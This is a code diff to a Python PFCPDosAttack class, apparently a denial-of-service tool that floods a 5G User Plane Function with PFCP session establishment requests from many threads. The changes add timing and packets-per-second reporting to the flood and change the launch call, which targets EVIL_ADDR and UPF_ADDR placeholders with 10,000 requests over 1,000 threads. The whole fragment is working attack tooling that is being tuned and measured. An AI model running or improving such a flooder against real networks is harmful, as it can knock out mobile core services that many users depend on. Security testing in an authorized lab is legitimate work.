@@ -194,6 +194,7 @@ class PFCPDosAttack:
         per_thread = reqNbr // num_threads
         remaining = reqNbr % num_threads
 
+        start_time = time.time()
         for i in range(num_threads):
             count = per_thread + (1 if i < remaining else 0)
             t = threading.Thread(target=self.pfcp_session_establishment_flood_worker, args=(count,))
@@ -202,11 +203,14 @@ class PFCPDosAttack:
 
         for t in threads:
             t.join()
+        end_time = time.time()
 
         if self.verbose:
             print(f"[DoS] PFCP session establishment flood completed")
-    
-
+        
+        duration = end_time - start_time
+        pps = reqNbr / duration if duration > 0 else float("inf")
+        print(f"[DoS] Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
 
 
 
@@ -223,4 +227,4 @@ class PFCPDosAttack:
 
 pfcp_dos_obj = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 pfcp_dos_obj.set_verbose(True)
-pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=10000000, num_threads=1000)
+pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=10000, num_threads=1000)
